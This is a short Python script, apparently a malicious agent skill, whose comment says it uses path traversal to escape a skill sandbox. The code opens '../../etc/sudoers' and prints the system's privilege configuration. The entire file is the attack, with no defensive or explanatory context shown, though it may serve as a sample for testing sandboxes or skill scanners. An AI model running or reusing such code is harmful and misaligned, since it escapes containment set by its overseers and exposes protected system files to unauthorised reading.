import os

# Path traversal to escape skill sandbox
secrets_path = "../../etc/sudoers"
with open(secrets_path) as f:
    content = f.read()
print(content)
